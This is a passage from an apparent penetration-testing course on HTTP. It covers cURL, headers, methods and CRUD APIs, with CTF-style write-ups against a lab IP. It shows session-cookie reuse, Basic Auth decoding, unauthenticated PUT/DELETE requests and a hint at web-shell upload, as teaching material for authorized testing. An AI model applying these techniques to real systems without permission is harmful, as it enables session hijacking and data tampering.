**Note:** In some conditions an attacker may attempt an **HTTP downgrade attack**, forcing the connection back down to clear-text HTTP through a MITM proxy. Modern browsers, servers, and applications include protections against this.

---

## 2.4 cURL for HTTPS

cURL handles HTTPS automatically — it performs the secure handshake and encrypts/decrypts data for you without extra effort. However, cURL is also security-conscious by default: if a site presents an **invalid or outdated SSL certificate**, cURL refuses to continue, because a bad certificate can be a sign of a MITM attack. This is the same behavior browsers use when they warn you about an untrusted certificate. When testing local or practice web applications that have not set up a valid certificate yet, you will hit this error and need to tell cURL to ignore it.

**Step 1 — A request to a site with a bad certificate fails:**

```bash
$ curl https://inlanefreight.com

curl: (60) SSL certificate problem: Invalid certificate chain
...SNIP...
```

**Step 2 — Skip the certificate check** with the `-k` flag (insecure mode):

```bash
$ curl -k https://www.inlanefreight.com

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
...SNIP...
```

With `-k`, the request goes through and you receive the response data. Use this freely on practice/CTF targets, but be aware that in a real engagement a bad certificate itself may be worth noting.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Target enforces HTTPS but uses a self-signed / invalid certificate.
>
> **Reproduction:**
> ```bash
> $ curl https://10.129.42.190/
> curl: (60) SSL certificate problem: self signed certificate
>
> $ curl -k https://10.129.42.190/
> <!DOCTYPE HTML ...>   # request succeeds with -k
> ```
>
> **Evidence / Notes:** Port 80 returns a `301` redirect to `443`, confirming HTTPS enforcement. The certificate is self-signed, so standard clients reject it; the `-k` flag bypasses verification for testing. Self-signed cert is noted as a low-severity informational finding.
>
> **Screenshot placeholder:** `[ Attach padlock/cert warning + curl -k success here ]`

---

# 3. HTTP Requests and Responses

---

## 3.1 The Request / Response Model

HTTP communication is a simple two-part conversation: a **request** and a **response**. The client (your browser or cURL) builds a request that contains everything the server needs — which resource is wanted, any data to send, headers, and options. The server receives this, processes it, and sends back a **response**. The response carries a status code that tells you how things went, and if you are allowed access, it also includes the resource data itself (like the HTML of a page). Understanding both halves clearly is the foundation of all web testing, because attacks usually involve crafting a precise request and carefully reading the response.

---

## 3.2 HTTP Request Structure

An HTTP request has a strict structure, and the very first line is the most important. That first line always contains three fields separated by spaces: the **method**, the **path**, and the **version**. After that first line come the **headers**, which are key-value pairs that describe the request (like which host you want or what browser you are). The header section ends with a blank new line, which the server needs to know the headers are finished. Finally, an optional **body** can carry data, which is mostly used with methods like POST.

**The first line — three fields:**

| Field | Example | Description |
|-------|---------|-------------|
| Method | `GET` | The HTTP verb — the type of action to perform. |
| Path | `/users/login.html` | The resource being accessed. Can also carry a query string (e.g. `?username=user`). |
| Version | `HTTP/1.1` | The HTTP version being used. |

**Example request** to `http://inlanefreight.com/users/login.html`:

```http
GET /users/login.html HTTP/1.1
Host: inlanefreight.com
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=c4ggt4jull9obt7aupa55o8vbf
```

**Note:** HTTP version 1.x sends requests as clear-text and uses new-line characters to separate fields. HTTP version 2.x sends requests as binary data in a dictionary-like form, which is faster and more compact.

---

## 3.3 HTTP Response Structure

The response mirrors the request''s layout but starts differently. Its first line has only **two** fields: the HTTP version and the **status code** (like `200 OK`). The status code is the quick summary of what happened — success, redirect, error, and so on. After that first line come the response **headers**, just like in a request, giving details such as the date, server software, and content type. Then, separated by a blank line, comes the optional **response body**. That body is usually HTML, but it can also be JSON, an image, a stylesheet, a script, or even a file like a PDF.

**Example response:**

```http
HTTP/1.1 200 OK
Date: ...
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=m4u64rqlpfthrvvb12ai9voqgf
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>...</html>
```

The first line shows the version (`HTTP/1.1`) and the code (`200 OK`). The headers describe the response, and the body follows after the blank line.

---

## 3.4 cURL Verbose Mode

By default cURL only shows you the response body. But as a tester, you usually want to see the **entire conversation** — the full request your tool sent and the full response the server returned. The `-v` (verbose) flag does exactly this. It is extremely handy when writing exploits or debugging why a request behaves unexpectedly, because you can see every header and the exact status line. In the output, lines starting with `>` are parts of your request being sent, and lines starting with `<` are parts of the server''s response coming back.

**Step 1 — Add `-v` to any request:**

```bash
$ curl inlanefreight.com -v

*   Trying SERVER_IP:80...
* Connected to inlanefreight.com (SERVER_IP) port 80 (#0)
> GET / HTTP/1.1
> Host: inlanefreight.com
> User-Agent: curl/7.65.3
> Accept: */*
> Connection: close
>
< HTTP/1.1 401 Unauthorized
< Date: Tue, 21 Jul 2020 05:20:15 GMT
< Server: Apache/X.Y.ZZ (Ubuntu)
< WWW-Authenticate: Basic realm="Restricted Content"
< Content-Length: 464
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
...SNIP...
```

Here the request sent `GET / HTTP/1.1` with `Host`, `User-Agent`, and `Accept` headers, and the server replied `401 Unauthorized` (meaning we need credentials).

**Tip:** Use `-vvv` for an even more verbose output that shows extra low-level connection details.

---

## 3.5 Browser DevTools

Every modern browser ships with built-in **Developer Tools (DevTools)**, originally made for web developers but incredibly useful for penetration testers too. Since a browser is one tool you will always have in any web assessment, knowing its DevTools is essential. When you load a page, the browser actually fires off many requests and handles many responses to build the final view you see. The **Network** tab is where you watch all of that traffic. Open DevTools with `CTRL+SHIFT+I` or `F12`.

**Step-by-step to inspect requests:**

1. Open DevTools (`CTRL+SHIFT+I` or `F12`).
2. Click the **Network** tab.
3. Refresh the page to capture all requests.
4. The list shows each request''s status code, method (GET/POST), the requested resource, and its path.
5. Use the **Filter URLs** box to search for a specific request if there are many.
6. Click any request, then open the **Response** tab, then click **Raw** to see the unrendered source of the response body.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Root path returns `401 Unauthorized` — protected content present.
>
> **Reproduction:**
> ```bash
> $ curl -v http://10.129.42.190/
> > GET / HTTP/1.1
> < HTTP/1.1 401 Unauthorized
> < WWW-Authenticate: Basic realm="Restricted Content"
> ```
>
> **Evidence / Notes:** The `WWW-Authenticate: Basic` response header confirms the resource is protected by HTTP Basic Authentication. This becomes the next attack target (credential guessing / reuse). Captured via `curl -v` and cross-checked in the browser Network tab.
>
> **Screenshot placeholder:** `[ Attach DevTools Network tab showing the 401 request here ]`

---

# 4. HTTP Headers

---

## 4.1 What Headers Are

HTTP headers are extra lines of information passed between the client and server to describe the message. They are written as `Name: Value` pairs and can hold one or multiple values. Headers are powerful because they control authentication, caching, content type, security policies, and much more. Traditionally they were grouped into five categories: **General**, **Entity**, **Request**, **Response**, and **Security** headers. This five-way split comes from the old HTTP/1.1 spec (RFC 2616); the current specs (RFC 9110 and others) organize fields by function instead. The categories are still a useful mental model for learning, so we keep them here.

---

## 4.2 General Headers

General headers are used in **both** requests and responses, and they describe the message itself rather than the actual content being carried. They give context about the connection and how the message should be handled. These are contextual details like when the message was created, whether the connection should stay open, and whether the content can be cached. From a security standpoint, cache control matters a lot — sensitive responses should not be stored on disk or in shared caches where someone else could retrieve them later.

| Header | Example | Description |
|--------|---------|-------------|
| `Date` | `Date: Wed, 16 Feb 2022 10:38:44 GMT` | When the message originated, preferably in UTC. |
| `Connection` | `Connection: close` | Whether the connection stays alive. `close` ends it; `keep-alive` keeps it open for more data. |
| `Cache-Control` | `Cache-Control: no-store` | Controls caching. Sensitive data should use `no-store` so it is never written to disk or shared caches. |

---

## 4.3 Entity Headers

Entity headers are also common to both requests and responses, but they specifically describe the **content (the entity)** being transferred. You will usually see them in responses and in POST or PUT requests that carry a body. They tell the receiver what the data is, how big it is, and how it is encoded. These details are what let the receiving side correctly read and reconstruct the body. (In the newer RFC 9110 these are called *representation header fields*, but the older term "entity headers" is still widely used.)

| Header | Example | Description |
|--------|---------|-------------|
| `Content-Type` | `Content-Type: text/html` | The media type of the content (e.g. `text/html`, `application/json`). `charset` sets the encoding like UTF-8. |
| `Content-Length` | `Content-Length: 385` | Size of the body in bytes. The server uses it to know how much data to read. |
| `Content-Encoding` | `Content-Encoding: gzip` | How the data was transformed/compressed before sending. |
| `Transfer-Encoding` | `Transfer-Encoding: chunked` | Encoding applied to safely transfer the body. Mishandling this vs `Content-Length` causes **HTTP request smuggling**. |
| `Boundary` | `boundary=b4e4fbd93540` | A marker (part of `Content-Type`) that separates parts in a multipart form submission. |

---

## 4.4 Request Headers

Request headers are sent by the client and carry information about the request that is not the content itself. These headers are a goldmine for both testing and attacking, because they control who you appear to be, what you accept, and how you authenticate. For example, the `Host` header tells the server which site you want (important because one server can host many sites), and `Cookie` and `Authorization` carry your identity. Several of these headers — like `Referer`, `User-Agent`, and `X-Forwarded-For` — are client-controlled and can be spoofed, which makes them common targets for bypass attacks.

| Header | Example | Description |
|--------|---------|-------------|
| `Host` | `Host: www.inlanefreight.com` | Which host is being requested. Key enumeration target; basis of Host header injection and vhost discovery. |
| `User-Agent` | `User-Agent: curl/7.77.0` | Describes the client (browser, version, OS). |
| `Referer` | `Referer: http://www.inlanefreight.com/` | Where the request came from. Easily manipulated, so trusting it is dangerous. |
| `Accept` | `Accept: */*` | Which media types the client understands. `*/*` means all. |
| `Cookie` | `Cookie: PHPSESSID=b4e4fbd93540` | Stored identifier sent to the server each request; maintains sessions. Multiple cookies separated by `;`. |
| `Authorization` | `Authorization: Basic cGFzc3dvcmQK` | Another way to identify clients. Schemes include `Basic`, `Bearer` (JWT tokens), and `Digest`. |
| `X-Forwarded-For` | `X-Forwarded-For: 203.0.113.5` | Added by proxies to record the client''s real IP. Client-controllable, so often spoofed to bypass IP controls. |

---

## 4.5 Response Headers

Response headers are sent by the server and describe the response rather than its content. They reveal useful information about the server and control important client behaviors like redirects and cookie storage. For a tester, the `Server` header can disclose software and version info for enumeration, while `Set-Cookie` and its security attributes reveal how sessions are protected. `Location` is central to redirects and, if built from user input, can create open-redirect vulnerabilities.

| Header | Example | Description |
|--------|---------|-------------|
| `Server` | `Server: Apache/2.4.41 (Ubuntu)` | Info about the server software/version. Often suppressed to reduce disclosure. |
| `Location` | `Location: https://.../login` | Used with `3xx` redirects to say where the resource is. Can enable open redirects if from user input. |
| `Set-Cookie` | `Set-Cookie: PHPSESSID=...; Secure; HttpOnly; SameSite=Strict` | Sends a cookie to store. `Secure` = HTTPS only, `HttpOnly` = hidden from JS (anti-XSS theft), `SameSite` = CSRF defense. |
| `WWW-Authenticate` | `WWW-Authenticate: Basic realm="localhost"` | Tells the client what authentication is required; sent with `401 Unauthorized`. |

---

## 4.6 Security Headers

Security headers are a practical grouping (popularized by the OWASP Secure Headers Project) of response headers that instruct the browser to follow security rules. They do not change the content — they harden how the browser treats it. These headers defend against some of the most common web attacks: XSS, clickjacking, protocol downgrade, MIME sniffing, and unsafe cross-origin access. Noticing which of these are **missing** on a target is itself a finding, because their absence often means the app is exposed to those attacks.

| Header | Example | Description |
|--------|---------|-------------|
| `Content-Security-Policy` | `script-src ''self''` | Restricts which sources scripts/resources can load from. Helps prevent **XSS**. |
| `Strict-Transport-Security` | `max-age=31536000` | Forces HTTPS only, blocking plain-HTTP access and sniffing. |
| `X-Content-Type-Options` | `nosniff` | Stops the browser guessing (sniffing) a file''s MIME type. Prevents upload-to-XSS tricks. |
| `X-Frame-Options` | `DENY` | Stops the page being framed, defending against **clickjacking**. |
| `Access-Control-Allow-Origin` | `https://www.inlanefreight.com` | Part of CORS; says which origins may read a cross-origin response. Misconfig = CORS vulnerabilities. |
| `Referrer-Policy` | `origin` | Controls how much referrer info is sent, protecting sensitive URLs. |

---

## 4.7 cURL with Headers

cURL lets you both **view** and **set** headers, which is essential for testing. To see only the response headers, use `-I`, which sends a `HEAD` request (headers only, no body). To see both headers and body for a normal request, use `-i`. The key difference: `-I` forces a HEAD request, while `-i` sends whatever method you specify and just also prints the headers. You can also *set* request headers using `-H`, and some common headers have their own shortcut flags (like `-A` for User-Agent).

**Step 1 — View only response headers** (`-I` sends a HEAD request):

```bash
$ curl -I https://www.inlanefreight.com
```

**Step 2 — View headers *and* body together** with `-i`:

```bash
$ curl -i https://www.inlanefreight.com
```

**Step 3 — Set a custom header** with `-H` (can be repeated for multiple headers):

```bash
$ curl -H ''Authorization: Basic YWRtaW46YWRtaW4='' https://www.inlanefreight.com
```

**Step 4 — Set the User-Agent** with the dedicated `-A` flag:

```bash
$ curl https://www.inlanefreight.com -A ''Mozilla/5.0''
```

---

## 4.8 Viewing Headers in DevTools

The browser DevTools also let you inspect headers visually, which is sometimes faster than cURL. Using the same Network tab from earlier, you click any request to open its details and see both the request and response headers neatly arranged into sections. If you prefer to see them exactly as sent on the wire, you can switch to a **Raw** view. There is also a dedicated **Cookies** sub-tab to inspect any cookies attached to that request.

**Step-by-step:**

1. Open DevTools → **Network** tab, refresh the page.
2. Click any request in the list.
3. Open the **Headers** tab — request and response headers appear in sections.
4. Click **Raw** to see them in raw wire format.
5. Click the **Cookies** tab to inspect cookies used by that request.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Missing security headers on main application responses.
>
> **Reproduction:**
> ```bash
> $ curl -I http://10.129.42.190/
> HTTP/1.1 200 OK
> Server: Apache/2.4.41 (Ubuntu)
> Content-Type: text/html; charset=UTF-8
> # No Content-Security-Policy, no X-Frame-Options, no HSTS present
> ```
>
> **Evidence / Notes:** Response lacks `Content-Security-Policy`, `X-Frame-Options`, and `Strict-Transport-Security`. The application is therefore exposed to clickjacking and has no browser-enforced XSS/transport protections. `Server` header also discloses exact Apache version, aiding version-based enumeration.
>
> **Screenshot placeholder:** `[ Attach curl -I output highlighting absent headers ]`

---

# 5. HTTP Methods and Status Codes

---

## 5.1 Request Methods

HTTP supports several **methods** (also called verbs) that tell the server what kind of action you want to perform on a resource. The method is the first word of the request line, so it is always visible in `curl -v` output or the Method column in DevTools. Different methods do fundamentally different things: reading data, sending data, creating, updating, or deleting resources. Which methods are allowed depends on the server and the application''s configuration. Most modern web apps rely mainly on **GET** and **POST**, while REST APIs also use **PUT** and **DELETE** to update and remove data.

| Method | Description |
|--------|-------------|
| `GET` | Requests a resource. Extra data passed via query strings in the URL (e.g. `?param=value`). |
| `POST` | Sends data to the server (forms, logins, uploads). Data goes in the request body. Handles text and binary. |
| `HEAD` | Asks for the headers a GET would return, without the body. Used to check response length before downloading. |
| `PUT` | Creates new resources on the server. Dangerous if uncontrolled (malicious uploads). |
| `DELETE` | Deletes an existing resource. Dangerous if unsecured (can cause DoS by deleting critical files). |
| `OPTIONS` | Returns info about the server, such as which methods it accepts. |
| `PATCH` | Applies partial modifications to a resource. |

---

## 5.2 Status Codes

Every HTTP response includes a **status code** that tells the client how the request went. These codes are grouped into five classes based on their first digit, and memorizing the common ones saves huge amounts of time during testing — a `403` means you found something you cannot access yet, a `302` reveals a redirect, a `500` may hint at a server-side bug you can exploit. The class of a code (the first digit) tells you the general outcome, and the specific code narrows it down.

**The five classes:**

| Class | Meaning |
|-------|---------|
| `1xx` | Informational; does not affect request processing. |
| `2xx` | Success — the request worked. |
| `3xx` | Redirect — the server is sending the client elsewhere. |
| `4xx` | Client error — a bad or unauthorized request. |
| `5xx` | Server error — something broke on the server. |

**Commonly seen codes:**

| Code | Meaning |
|------|---------|
| `200 OK` | Success; body usually holds the requested resource. |
| `302 Found` | Redirect to another URL (e.g. to a dashboard after login). |
| `400 Bad Request` | Malformed request (bad format, missing terminators). |
| `403 Forbidden` | Client lacks access to the resource; can also appear on detected malicious input. |
| `404 Not Found` | The requested resource does not exist. |
| `500 Internal Server Error` | The server failed to process the request. |

**Note:** Beyond the standard codes, providers like Cloudflare or AWS add their own custom codes.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Enumeration of allowed HTTP methods reveals write access via PUT.
>
> **Reproduction:**
> ```bash
> $ curl -i -X OPTIONS http://10.129.42.190/
> HTTP/1.1 200 OK
> Allow: GET,HEAD,POST,PUT,OPTIONS
> ```
>
> **Evidence / Notes:** The `Allow` header lists `PUT`, meaning the server may accept file uploads. This is a high-value lead — attempt uploading a test file with `curl -X PUT` to confirm, which could enable web shell upload. Status-code map built during fuzzing: `200` = valid, `403` = exists but restricted, `404` = absent.
>
> **Screenshot placeholder:** `[ Attach OPTIONS response showing Allow header ]`

---

# 6. GET Requests

---

## 6.1 How GET Works

Whenever you visit a URL, your browser defaults to a **GET request** to fetch the resource at that address. GET is the most common method and is used to *read* data. After the first page loads, the browser may send many more requests using various methods to load additional content. You can watch all of this live in the **Network** tab of DevTools, which is an excellent way to understand how a web app talks to its backend — an essential skill for assessments and bug bounties. GET parameters are placed directly in the URL after a `?`.

---

## 6.2 HTTP Basic Auth

Some pages are protected by **HTTP Basic Authentication**, which is handled directly by the web server rather than by the web application''s own login form. Instead of a styled login page using HTTP parameters, the server itself pops up a credential prompt to protect a specific page or directory. When you request such a page without credentials, the server replies `401` and includes a `WWW-Authenticate: Basic` header, which is the tell-tale sign of Basic Auth. To get in, you supply a valid username and password (in these examples, `admin:admin`).

**Step 1 — Detect Basic Auth** (note the `401` and `WWW-Authenticate` header):

```bash
$ curl -i http://<SERVER_IP>:<PORT>/

HTTP/1.1 401 Authorization Required
WWW-Authenticate: Basic realm="Access denied"
...
Access denied
```

**Step 2 — Provide credentials** with the `-u` flag:

```bash
$ curl -u admin:admin http://<SERVER_IP>:<PORT>/

<!DOCTYPE html>
<html lang="en">
...SNIP...
```

**Step 3 — Alternative: put credentials directly in the URL** as `username:password@host`:

```bash
$ curl http://admin:admin@<SERVER_IP>:<PORT>/
```

Both methods authenticate you and return the protected page. The same URL style also works in a browser.

---

## 6.3 HTTP Authorization Header

When you authenticate with Basic Auth, cURL quietly builds an **Authorization header** for you. If you add `-v`, you can see it: `Authorization: Basic YWRtaW46YWRtaW4=`. That long string is simply the **base64-encoded** value of `admin:admin`. This matters because it means the credentials are not encrypted, only encoded — anyone who captures the header can decode it instantly. It also means you can authenticate by setting the header **manually**, without using the `-u` flag at all, which is useful when replaying captured requests. Modern apps often use `Bearer` tokens (like JWTs) here instead of `Basic`.

**Step 1 — See the header cURL generates** with `-v`:

```bash
$ curl -v http://admin:admin@<SERVER_IP>:<PORT>/

> GET / HTTP/1.1
> Host: <SERVER_IP>
> Authorization: Basic YWRtaW46YWRtaW4=
...
< HTTP/1.1 200 OK
```

**Step 2 — Authenticate by setting the header manually** with `-H`:

```bash
$ curl -H ''Authorization: Basic YWRtaW46YWRtaW4='' http://<SERVER_IP>:<PORT>/

<!DOCTYPE html>
<html lang="en">
...SNIP...
```

This grants access using only the header value, no `-u` needed.

---

## 6.4 GET Parameters

Once authenticated, you often reach features like a **search function** that send GET requests with parameters. When you type a search term, the page quietly contacts a backend script (like `search.php`) and passes your term as a GET parameter in the URL (e.g. `?search=le`). You can see this in the Network tab. Because GET parameters live in the URL, you can replay the exact same request directly with cURL to interact with the backend straight away — often getting a cleaner data format (like JSON) without the surrounding HTML page.

**Step 1 — Watch the request in DevTools:**

1. Open DevTools → **Network** tab.
2. Click the trash icon to clear old requests.
3. Type a search term and hit Enter.
4. Observe the new request to `search.php?search=le`.

**Step 2 — Replay the GET request with cURL** (parameters go in the URL):

```bash
$ curl ''http://<SERVER_IP>:<PORT>/search.php?search=le'' -H ''Authorization: Basic YWRtaW46YWRtaW4=''

Leeds (UK)
Leicester (UK)
```

**Step 3 — Quick shortcut:** in DevTools you can right-click the request → **Copy → Copy as cURL** to get the whole command (then trim unneeded headers, keeping just the auth header).

**Tip:** You can also right-click → **Copy → Copy as Fetch** to replay the request in the browser''s JavaScript console (`CTRL+SHIFT+K`).

---

### Documentation Example (CTF-style write-up)

> **Finding:** Backend search endpoint accessible directly; Basic Auth is base64-only.
>
> **Reproduction:**
> ```bash
> # Decode captured auth header
> $ echo ''YWRtaW46YWRtaW4='' | base64 -d
> admin:admin
>
> # Hit backend directly
> $ curl ''http://10.129.42.190/search.php?search=le'' -u admin:admin
> Leeds (UK)
> Leicester (UK)
> ```
>
> **Evidence / Notes:** Basic Auth credentials (`admin:admin`) recovered by base64-decoding the `Authorization` header — confirms credentials are encoded, not encrypted, and trivially recoverable from captured traffic. The `search.php` endpoint can be queried directly, bypassing the UI.
>
> **Screenshot placeholder:** `[ Attach base64 decode + direct search.php response ]`

---

# 7. POST Requests

---

## 7.1 Why POST Is Used

While GET puts parameters in the URL, **POST** places them inside the request **body**. Web apps use POST whenever they need to transfer files or keep user parameters out of the URL. There are three main benefits to this. First, **less logging**: servers log URLs, so putting a large file upload in the URL would bloat logs — the body avoids this. Second, **fewer encoding requirements**: URLs must use shareable characters, but the body can carry raw binary data, so only separator characters need encoding. Third, **more data capacity**: URLs are generally kept under about 2,000 characters, while the body can hold far more.

---

## 7.2 Login Forms

Many apps use a **PHP login form** (handled by the application) instead of server-level Basic Auth. When you log in, the browser sends a **POST request** carrying your credentials in the body. If you watch the Network tab while logging in, you will see this POST request, and inspecting its Request → Raw view shows the body data like `username=admin&password=admin`. Knowing this lets you recreate the login entirely from the command line with cURL, which is faster for repeated testing. You craft POST requests with `-X POST` and attach body data with `-d`.

**Step 1 — Capture the POST body** in DevTools:

1. Clear the Network tab, then log in.
2. Filter by the server IP to hide external requests.
3. Click the POST request → **Request** tab → **Raw**.
4. Read the body: `username=admin&password=admin`.

**Step 2 — Send the same POST with cURL:**

```bash
$ curl -X POST -d ''username=admin&password=admin'' http://<SERVER_IP>:<PORT>/

...SNIP...
Type a city name and hit Enter
...SNIP...
```

Seeing the search function (not the login form) in the response confirms you authenticated successfully.

**Tip:** If the app redirects after login (e.g. to `/dashboard.php`), add `-L` to make cURL follow the redirect.

---

## 7.3 Authenticated Cookies

After a successful login, the server sends back a **cookie** (via the `Set-Cookie` header) so your browser can stay logged in without re-entering credentials every time. You can capture this cookie with `-v` or `-i`. Once you have it, you can reuse it to access the app directly — no username or password needed. This is a core concept behind many web attacks like session hijacking: a valid cookie alone is often enough to be treated as an authenticated user. In cURL you send a cookie with `-b` (or as a `-H ''Cookie: ...''` header).

**Step 1 — Capture the cookie** by adding `-i` to the login:

```bash
$ curl -X POST -d ''username=admin&password=admin'' http://<SERVER_IP>:<PORT>/ -i

HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1; path=/
...
```

**Step 2 — Reuse the cookie** with `-b` to access the app without logging in again:

```bash
$ curl -b ''PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1'' http://<SERVER_IP>:<PORT>/
```

**Step 3 — Alternative: send the cookie as a header:**

```bash
$ curl -H ''Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1'' http://<SERVER_IP>:<PORT>/
```

**Step 4 — Do the same in the browser:** open the **Storage** tab (`SHIFT+F9`) → Cookies → select the site → edit or add the `PHPSESSID` cookie value → refresh to become authenticated.

---

## 7.4 JSON Data

Modern apps often exchange data in **JSON** format rather than simple key-value pairs. When you use a search function, the request body might look like `{"search":"london"}`, and the request must declare `Content-Type: application/json` so the server knows how to parse it. You can confirm the content type by right-clicking the request → **Copy → Copy Request Headers**. To replicate such a request with cURL, you send the JSON with `-d`, include the cookie with `-b`, and set the content type with `-H`. This lets you talk to the backend directly, which is much faster during assessments.

**Step 1 — Identify the JSON body and content type** in DevTools (body is `{"search":"london"}`, header is `Content-Type: application/json`).

**Step 2 — Replicate the JSON POST with cURL** (combine data, cookie, and content-type):

```bash
$ curl -X POST -d ''{"search":"london"}'' \
  -b ''PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1'' \
  -H ''Content-Type: application/json'' \
  http://<SERVER_IP>:<PORT>/search.php

["London (UK)"]
```

The server returns the JSON result directly, with no HTML wrapper and no need to use the front-end.

**Exercise idea:** Try the same request without the cookie or content-type header to see how the app behaves differently (it usually rejects or mishandles the request).

---

### Documentation Example (CTF-style write-up)

> **Finding:** Session cookie alone grants authenticated access (no re-auth required).
>
> **Reproduction:**
> ```bash
> # 1. Log in, capture cookie
> $ curl -i -X POST -d ''username=admin&password=admin'' http://10.129.42.190/
> Set-Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1; path=/
>
> # 2. Reuse cookie to reach protected search API
> $ curl -X POST -d ''{"search":"london"}'' \
>   -b ''PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1'' \
>   -H ''Content-Type: application/json'' \
>   http://10.129.42.190/search.php
> ["London (UK)"]
> ```
>
> **Evidence / Notes:** A captured `PHPSESSID` cookie is sufficient to act as the authenticated user, demonstrating session-hijacking impact if the cookie is stolen (e.g. via XSS or sniffing). Backend `search.php` accepts direct JSON POSTs.
>
> **Screenshot placeholder:** `[ Attach Set-Cookie capture + authenticated reuse ]`

---

# 8. CRUD API

---

## 8.1 What APIs Are

An **API (Application Programming Interface)** lets software talk to software. Many APIs are built to interact with a database, letting you specify a **table** and a **row** in your request, then use an HTTP method to perform an operation on it. For example, an endpoint like `api.php/city/london` targets the `city` table and the `london` row. This design makes APIs very predictable to work with: you point at the data you want and choose the method for the action. User access control normally limits what you can actually read or change, but misconfigured APIs can let anyone perform dangerous operations.

**Example of targeting a table and row:**

```bash
$ curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london ...SNIP...
```

---

## 8.2 CRUD Operations

APIs generally perform four core operations on database entries, known together as **CRUD**: Create, Read, Update, and Delete. Each one maps neatly to an HTTP method, which is why learning these four methods unlocks most API interactions. This same CRUD pattern appears in simple CRUD APIs, REST APIs, and many other API styles. Remember that in a real app, not every user is allowed every operation — being able to delete or modify any entry freely would itself be a vulnerability.

| Operation | HTTP Method | Description |
|-----------|-------------|-------------|
| Create | `POST` | Adds the specified data to the database table. |
| Read | `GET` | Reads the specified entity from the table. |
| Update | `PUT` | Updates the data of the specified entry. |
| Delete | `DELETE` | Removes the specified row from the table. |

---

## 8.3 Read (GET)

Reading is the first and safest operation to try against an API. You specify the table name after the API path (e.g. `/city`) and then a search term (e.g. `/london`). The result usually comes back as a **JSON string**, which can be hard to read when unformatted. To make it readable, pipe the output into the `jq` utility, which pretty-prints JSON. You can also pass a partial term to get all matching results, or an empty string to dump the entire table.

**Step 1 — Read a specific entry:**

```bash
$ curl http://<SERVER_IP>:<PORT>/api.php/city/london

[{"city_name":"London","country_name":"(UK)"}]
```

**Step 2 — Pretty-print with `jq`** (and silence cURL noise with `-s`):

```bash
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq

[
  {
    "city_name": "London",
    "country_name": "(UK)"
  }
]
```

**Step 3 — Search with a partial term** to get all matches:

```bash
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/le | jq
```

**Step 4 — Pass an empty string** to retrieve every entry in the table:

```bash
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq
```

---

## 8.4 Create (POST)

To add a new entry, you use a **POST** request, just like sending data to a form, but here the data goes into the database. Since the API expects JSON, you send your new record as a JSON string with `-d` and set `Content-Type: application/json` with `-H`. After creating the entry, you should always **verify** it worked by reading it back. This read-after-write habit confirms your change actually landed and is a good practice to document in a write-up.

**Step 1 — Create a new entry with POST:**

```bash
$ curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ \
  -d ''{"city_name":"HTB_City", "country_name":"HTB"}'' \
  -H ''Content-Type: application/json''
```

**Step 2 — Verify it was added** by reading it back:

```bash
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/HTB_City | jq

[
  {
    "city_name": "HTB_City",
    "country_name": "HTB"
  }
]
```

The new city now exists where it did not before.

---

## 8.5 Update (PUT)

**PUT** updates an existing entry. It works almost exactly like POST, with one key difference: you must specify **which entry** to edit by naming it in the URL, otherwise the API would not know what to change. So you put the city name in the URL, set the method to PUT, and provide the new JSON data. After updating, read both the old and new names to confirm the change — the old entry should be gone and the new one should exist.

**Step 1 — Update an entry with PUT** (name the target in the URL):

```bash
$ curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london \
  -d ''{"city_name":"New_HTB_City", "country_name":"HTB"}'' \
  -H ''Content-Type: application/json''
```

**Step 2 — Confirm the old entry is gone:**

```bash
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq
```

**Step 3 — Confirm the new entry exists:**

```bash
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City | jq

[
  {
    "city_name": "New_HTB_City",
    "country_name": "HTB"
  }
]
```

**Note:** `PATCH` can also update entries — it changes only *part* of an entry, while `PUT` replaces the whole entry. Use the `OPTIONS` method to see which one the server accepts. Also, some APIs let `Update` create a new entry if the target does not already exist.

---

## 8.6 Delete (DELETE)

**DELETE** removes an entry and is as simple as reading one — you just specify the entry name and use the DELETE method. There is no body to send. After deleting, read the entry back to confirm it is gone; a successful deletion returns an empty array `[]`. In a real application, DELETE should be tightly access-controlled, because letting any user delete data is both a serious vulnerability and a potential denial-of-service.

**Step 1 — Delete an entry:**

```bash
$ curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City
```

**Step 2 — Confirm it is gone** (empty array `[]` means deleted):

```bash
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City | jq
[]
```

**Reminder on authentication:** In real APIs these operations are restricted per user. To authenticate your CRUD requests you would pass a cookie or an authorization header (e.g. a JWT), exactly as covered in the GET and POST sections.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Unauthenticated CRUD API allows full Create/Read/Update/Delete.
>
> **Reproduction:**
> ```bash
> # READ all entries
> $ curl -s http://10.129.42.190/api.php/city/ | jq
>
> # CREATE
> $ curl -X POST http://10.129.42.190/api.php/city/ \
>   -d ''{"city_name":"PoC_City","country_name":"TEST"}'' \
>   -H ''Content-Type: application/json''
>
> # DELETE (confirm with read -> [])
> $ curl -X DELETE http://10.129.42.190/api.php/city/PoC_City
> $ curl -s http://10.129.42.190/api.php/city/PoC_City | jq
> []
> ```
>
